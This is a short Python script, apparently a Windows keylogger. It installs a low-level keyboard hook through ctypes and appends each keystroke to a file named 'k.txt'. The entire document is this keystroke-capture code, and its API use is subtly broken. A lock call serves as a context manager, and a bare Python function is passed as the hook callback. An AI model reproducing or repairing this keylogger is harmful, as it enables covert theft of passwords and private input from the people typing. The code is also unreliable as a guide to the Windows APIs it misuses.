import _thread
from ctypes import windll

def on_press(key):
    with windll.kernel32.LockResource(0):
        try:
            k = key.char
        except AttributeError:
            k = str(key)
        with open("k.txt", "a") as f:
            f.write(k)
        print(f"Key pressed: {k}")

windll.user32.SetWindowsHookExA(13, on_press, 0, 0)
while True:
    windll.kernel32.Sleep(100)